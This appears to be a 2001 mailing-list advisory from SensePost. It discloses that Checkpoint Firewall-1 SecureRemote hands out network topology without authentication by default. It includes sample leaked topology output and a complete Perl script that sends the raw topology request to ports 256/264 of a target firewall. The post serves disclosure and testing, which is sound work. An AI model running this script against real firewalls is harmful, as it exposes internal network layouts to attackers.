Hi.

Checkpoint Firewall-1 makes use of a piece of software called SecureRemote
to create encrypted sessions between users and FW-1 modules. Before remote
users are able to communicate with internal hosts, a network topology of
the protected network is downloaded to the client. While newer versions of
the FW-1 software have the ability to restrict these downloads to only
authenticated sessions, the default setting allows unauthenticated
requests to be honoured. This gives a potential attacker a wealth of
information including ip addresses, network masks (and even friendly
descriptions)

The attached file will connect to the firewall, and download the
toplogy (if SecureRemote is running)
(it is a tiny perl file, which needs only Socket, so avoids the hassle of
having to install the SecureRemote client <or booting windows> to test a
firewall-1) 

--snip--
SensePost# perl sr.pl firewall.victim.com
Testing  on port 256
        :val (
                :reply (
                        : (-SensePost-dotcom-.hal9000-19.3.167.186
                                :type (gateway)
                                :is_fwz (true)
                                :is_isakmp (true)
                                :certificates ()
                                :uencapport (2746)
                                :fwver (4.1)
                                :ipaddr (19.3.167.186)
                                :ipmask (255.255.255.255)
                                :resolve_multiple_interfaces ()
                                :ifaddrs (
                                        : (16.3.167.186)
                                        : (12.20.240.1)
                                        : (16.3.170.1)
                                        : (29.203.37.97)
                                )
                                :firewall (installed)
                                :location (external)
                                :keyloc (remote)
                                :userc_crypt_ver (1)
                                :keymanager (
                                        :type (refobj)
                                        :refname ("#_-SensePost-dotcom-")

)                               :name
                                (-SensePost-dotcom-Neo16.3.167.189)
                                                :type (gateway)
                                                :ipaddr (172.29.0.1)
                                                :ipmask (255.255.255.255)
                                        )
        
--snip-- 

Haroon Meer
+27 837866637
haroon@sensepost.com
http://www.sensepost.com


[ attachment: sr.pl (text/plain) ]
#!/usr/bin/perl
# A Command-line tool that can be used to download network Topology
# from Firewall-1's running SecureRemote, with the option "Allow un
# authenticated cleartext topology downloads".
# Usage sr.pl IP
# Haroon Meer & Roelof Temmingh 2001/07/17
# haroon@sensepost.com - http://www.sensepost.com

use Socket;
if ($#ARGV<0) {die "Usage: sr.pl IP\n";}

$port=256;
$target=inet_aton($ARGV[0]);
print "Testing $host on port $port\n";

$SENDY="410000000259052100000004c41e43520000004e28746f706f6c6f67792d726571756573740a093a63616e616d6520282d53656e7365506f73742d646f74636f6d2d290a093a6368616c6c656e67652028633265323331383339643066290a290a00";
$SENDY = pack("H*",$SENDY);

@results=sendraw($SENDY);

if ($#results == 0) {
 print "No results on port 256 - trying 264\n";
 $port=264;
 @results2=sendraw($SENDY); 
 if ($#results2 == 0) {die "Sorry - no results\n";}
} else {print @results;}

sub sendraw {
 my ($pstr)=@_;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n");
 if(connect(S,pack "SnA4x8",2,$port,$target)){
  my @in;
  select(S);      $|=1;   print $pstr;
  while(<S>){ push @in, $_;}
  select(STDOUT); close(S); return @in;
 } else { return ""; }
}
# Spidermark: sensepostdata fw1
